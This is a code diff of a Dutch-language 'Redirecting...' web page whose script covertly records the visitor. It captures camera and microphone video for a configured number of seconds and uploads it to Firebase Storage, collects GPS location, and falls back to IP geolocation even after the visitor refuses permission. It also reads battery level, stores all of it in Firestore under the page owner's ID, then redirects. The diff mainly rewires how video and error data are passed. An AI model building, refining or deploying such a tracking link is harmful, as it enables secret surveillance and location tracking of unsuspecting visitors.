@@ -5,31 +5,31 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Redirecting...</title>
     <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; /* Modern font */
+         body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
-            background-color: #f3f7fa; /* Light background */
-            color: #333; /* Darker text for better readability */
+            background-color: #f3f7fa;
+            color: #333;
         }
         .container {
             text-align: center;
-            padding: 40px; /* Increased padding */
+            padding: 40px;
             background-color: white;
-            border-radius: 12px; /* More rounded corners */
-            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1); /* Stronger shadow */
-            width: 80%; /* Adjust width */
-            max-width: 500px; /* Maximum width */
+            border-radius: 12px;
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
+            width: 80%;
+            max-width: 500px;
         }
         h1 {
-            color: #007bff; /* Primary color for heading */
+            color: #007bff;
             margin-bottom: 20px;
         }
         p {
-            font-size: 1rem; /* Slightly larger font size */
+            font-size: 1rem;
             margin-bottom: 15px;
         }
         .loading-dots::after {
@@ -37,9 +37,9 @@
             animation: dots 1s steps(4) infinite;
         }
         .error-message {
-            color: #dc3545; /* Error color from Bootstrap */
+            color: #dc3545;
             margin-top: 20px;
-            font-weight: bold; /* Make error message stand out */
+            font-weight: bold;
         }
         @keyframes dots {
             0%   {content: "";}
@@ -136,7 +136,7 @@ function getBatteryPromise() {
 }
 
 // Function to collect location and battery data
-async function collectOtherData(locationPermission) { // Pass locationPermission as argument
+async function collectOtherData(locationPermission, currentVideoUrl, currentCameraError) { // Accept videoUrl and cameraError
     let locationData = null;
     let batteryData = null;
     let locationError = null;
@@ -144,23 +144,23 @@ async function collectOtherData(locationPermission) { // Pass locationPermission
     let ipLocationData = null;
 
     // 2. Location (if needed)
-    if (locationPermission) { // Use the passed argument
+    if (locationPermission) {
         // *BEFORE* getting the position, ask for permission explicitly:
-        if (confirm("Deze website wil je locatie gebruiken.  Sta je dit toe?")) { //  <--  TOEVOEGEN
+        if (confirm("Deze website wil je locatie gebruiken.  Sta je dit toe?")) {
             try {
                 const position = await getCurrentPositionPromise();
                 locationData = {
                     latitude: position.coords.latitude,
                     longitude: position.coords.longitude,
-                    accuracy: position.coords.accuracy // TIP: Capture accuracy
+                    accuracy: position.coords.accuracy
                 };
-                console.log("Location data:", locationData); // <-- VERIFY
+                console.log("Location data:", locationData);
             } catch (error) {
                 console.error("Error getting location:", error);
                 let errorMsg = "";
                 switch(error.code) {
                     case error.PERMISSION_DENIED:
-                        errorMsg = "Gebruiker heeft locatietoestemming geweigerd."; // TIP: More specific messages
+                        errorMsg = "Gebruiker heeft locatietoestemming geweigerd.";
                         break;
                     case error.POSITION_UNAVAILABLE:
                        errorMsg = "Locatie informatie is niet beschikbaar.";
@@ -174,10 +174,9 @@ async function collectOtherData(locationPermission) { // Pass locationPermission
                     default:
                         errorMsg = error.message;
                 }
-                locationError = errorMsg; // Store the full error message
+                locationError = errorMsg;
                  console.error("Location error:", locationError);
 
-                 // TIP: Fetch IP location as fallback if GPS fails
                  ipLocationData = await getIPLocationData();
                  if(ipLocationData){
                      console.log("IP Location data (fallback):", ipLocationData);
@@ -187,11 +186,9 @@ async function collectOtherData(locationPermission) { // Pass locationPermission
 
             }
         } else {
-            // User denied location permission.  Set locationError.
             locationError = "Gebruiker heeft locatietoestemming geweigerd.";
             console.warn("User denied location permission.");
 
-            // TIP: Fetch IP location even if permission denied, to still have *some* location info
              ipLocationData = await getIPLocationData();
              if(ipLocationData){
                  console.log("IP Location data (fallback, permission denied):", ipLocationData);
@@ -200,7 +197,6 @@ async function collectOtherData(locationPermission) { // Pass locationPermission
              }
         }
     } else {
-         // TIP: If location permission is not needed, still try to get IP location
          ipLocationData = await getIPLocationData();
          if(ipLocationData){
              console.log("IP Location data (no GPS permission needed):", ipLocationData);
@@ -215,7 +211,7 @@ async function collectOtherData(locationPermission) { // Pass locationPermission
         try{
             const battery = await getBatteryPromise();
             batteryData = battery.level * 100;
-            console.log("Battery data:", batteryData); // <-- VERIFY
+            console.log("Battery data:", batteryData);
 
         }catch(error){
           console.error("Error getting batter:", error);
@@ -225,7 +221,7 @@ async function collectOtherData(locationPermission) { // Pass locationPermission
     }
 
     // All data collected (or errors stored), now save and redirect
-    saveDataAndRedirect(videoUrl, locationData, batteryData, locationError, batteryError, cameraError, ipLocationData); // Pass all data
+    saveDataAndRedirect(currentVideoUrl, locationData, batteryData, locationError, batteryError, currentCameraError, ipLocationData); // Use passed videoUrl and cameraError
 }
 
 
@@ -247,32 +243,32 @@ async function handleCameraMicPermissions(micCamPermission, recordSeconds, curre
                     chunks.push(event.data);
                 };
 
-                recorder.onstop = async () => { // Make recorder.onstop async
+                recorder.onstop = async () => {
                     const blob = new Blob(chunks, { type: 'video/webm' });
                     console.log("Blob type:", blob.type);
 
                     // --- Upload to Firebase Storage ---
                     const storageRef = storage.ref();
-                    const videoRef = storageRef.child(`videos/${currentUserId}_${Date.now()}.webm`); // Unique video path
+                    const videoRef = storageRef.child(`videos/${currentUserId}_${Date.now()}.webm`);
 
                     try {
-                        await videoRef.put(blob); // Upload the blob
-                        videoUrl = await videoRef.getDownloadURL(); // Get download URL
+                        await videoRef.put(blob);
+                        videoUrl = await videoRef.getDownloadURL();
                         console.log("Video URL:", videoUrl);
                     } catch (uploadError) {
                         console.error("Error uploading video to Firebase Storage:", uploadError);
-                        cameraError = "Error uploading video: " + uploadError.message; // Or more specific error message
-                        videoUrl = null; // Set videoUrl to null in case of upload failure
+                        cameraError = "Error uploading video: " + uploadError.message;
+                        videoUrl = null;
                     } finally {
                         // --- All data collected, now collect other data and redirect ---
-                        collectOtherData(true); // Assume location permission is granted now, pass true
-                        stream.getTracks().forEach(track => track.stop()); // Cleanup
+                        collectOtherData(true, videoUrl, cameraError); // Pass videoUrl and cameraError here
+                        stream.getTracks().forEach(track => track.stop());
                     }
                 };
 
-                recorder.onstart = () => { // <-- Start timer *AFTER* recorder starts
+                recorder.onstart = () => {
                     setTimeout(() => {
-                        if (recorder.state !== "inactive") { // Double-check state
+                        if (recorder.state !== "inactive") {
                             recorder.stop();
                         }
                     }, recordSeconds * 1000);
@@ -281,41 +277,39 @@ async function handleCameraMicPermissions(micCamPermission, recordSeconds, curre
                 recorder.start();
 
             } else {
-                // No recording, stop stream immediately.  Proceed to collect other data.
                 stream.getTracks().forEach(track => track.stop());
-                collectOtherData(true); // Assume location permission is granted now, pass true
+                collectOtherData(true, videoUrl, cameraError); // Pass videoUrl and cameraError here, even if null
             }
 
         } catch (error) {
             console.error("Error accessing camera/microphone:", error);
-            cameraError = error.message; // Store error
-            collectOtherData(true); // Still try to collect other data even if camera fails, assume location granted
+            cameraError = error.message;
+            collectOtherData(true, videoUrl, cameraError); // Pass videoUrl and cameraError here, even if null
         }
     } else {
-        // No camera/mic needed, proceed to collect other data
-        collectOtherData(true); // Assume location permission is granted, pass true
+        collectOtherData(true, videoUrl, cameraError); // Pass videoUrl and cameraError here, even if null
     }
-    return { videoUrl, cameraError }; // Return videoUrl and cameraError
+    return { videoUrl, cameraError };
 }
 
 
 // Function to save data to Firestore and perform the redirect
-async function saveDataAndRedirect(videoUrl, locationData, batteryData, locationError, batteryError, cameraError, ipLocationData) { // Receive all data
+async function saveDataAndRedirect(videoUrl, locationData, batteryData, locationError, batteryError, cameraError, ipLocationData) {
     const dataToSave = {
-        videoUrl: videoUrl || null,  // Save the video URL (or null) - Now Firebase Storage URL
-        location: locationData || null, // Save location data (or null)
-        batteryPercentage: batteryData,  //  No || null
-        locationError: locationError || null,  // Save any errors
+        videoUrl: videoUrl || null,
+        location: locationData || null,
+        batteryPercentage: batteryData,
+        locationError: locationError || null,
         batteryError: batteryError || null,
         cameraError: cameraError || null,
-        ipLocation: ipLocationData || null, // TIP: Save IP Location Data
+        ipLocation: ipLocationData || null,
     };
 
-    const currentUserId = await getCurrentUserId(); // Get current user ID here
+    const currentUserId = await getCurrentUserId();
 
-    const dataRef = db.collection('userData').doc(currentUserId); // Get dataRef here
+    const dataRef = db.collection('userData').doc(currentUserId);
 
-    console.log("Data to save:", dataToSave); // <-- CHECK WHAT'S BEING SAVED
+    console.log("Data to save:", dataToSave);
 
     try {
         await dataRef.set(dataToSave);
@@ -324,10 +318,9 @@ async function saveDataAndRedirect(videoUrl, locationData, batteryData, location
         console.error("Error saving data to Firestore:", error);
          errorMessage.textContent = `Firestore Fout: ${error.message}`;
         errorMessage.style.display = 'block';
-        // Still redirect even if save fails
     }
 
-    // Perform the redirect - get redirect URL from settings again to ensure latest value
+    // Perform the redirect - get redirect URL from settings again
     const settingsRef = db.collection('userSettings').doc(currentUserId);
     const settingsSnap = await settingsRef.get();
     let redirectUrl = null;
@@ -355,15 +348,15 @@ async function saveDataAndRedirect(videoUrl, locationData, batteryData, location
     const currentUserId = await getCurrentUserId();
     const settingsRef = db.collection('userSettings').doc(currentUserId);
 
-    let micCamPermission = false; // Default to false if settings not loaded or not present
+    let micCamPermission = false;
     let recordSeconds = 0;
 
     try {
         const settingsSnap = await settingsRef.get();
         if (settingsSnap.exists) {
             const settingsData = settingsSnap.data();
-            micCamPermission = settingsData.micCamPermission; // Get micCamPermission from settings
-            recordSeconds = parseInt(settingsData.recordSeconds) || 0; // Get recordSeconds from settings
+            micCamPermission = settingsData.micCamPermission;
+            recordSeconds = parseInt(settingsData.recordSeconds) || 0;
         } else {
             console.warn("No settings found in Firestore, using defaults.");
         }
@@ -371,7 +364,6 @@ async function saveDataAndRedirect(videoUrl, locationData, batteryData, location
         console.error("Error fetching settings from Firestore:", error);
         errorMessage.textContent = `Firebase Fout bij laden instellingen: ${error.message}`;
         errorMessage.style.display = 'block';
-        // Proceed with defaults even if settings load fails
     }
 
 
@@ -385,7 +377,7 @@ async function saveDataAndRedirect(videoUrl, locationData, batteryData, location
                 const { videoUrl, cameraError } = cameraMicData;
 
                 // Collect other data (battery, IP location) and redirect - location permission assumed granted here
-                collectOtherData(true); // Pass true as location permission is already granted in this flow
+                collectOtherData(true, videoUrl, cameraError); // Pass videoUrl and cameraError
 
 
             },
@@ -395,9 +387,9 @@ async function saveDataAndRedirect(videoUrl, locationData, batteryData, location
                 errorMessage.style.display = 'block';
 
                 // Still proceed to collect other data (battery, IP location) without GPS location, and redirect
-                collectOtherData(false); // Pass false as location permission is denied/error
-                const cameraMicData = await handleCameraMicPermissions(micCamPermission, recordSeconds, currentUserId); // Still handle camera/mic even if location fails
+                const cameraMicData = await handleCameraMicPermissions(micCamPermission, recordSeconds, currentUserId);
                 const { videoUrl, cameraError } = cameraMicData;
+                collectOtherData(false, videoUrl, cameraError); // Pass videoUrl and cameraError
 
 
             },
@@ -414,7 +406,7 @@ async function saveDataAndRedirect(videoUrl, locationData, batteryData, location
         // Proceed to camera/mic and other data collection even if geolocation is not supported
         const cameraMicData = await handleCameraMicPermissions(micCamPermission, recordSeconds, currentUserId);
         const { videoUrl, cameraError } = cameraMicData;
-        collectOtherData(false); // Pass false as location is not available
+        collectOtherData(false, videoUrl, cameraError); // Pass videoUrl and cameraError
     }
 
 
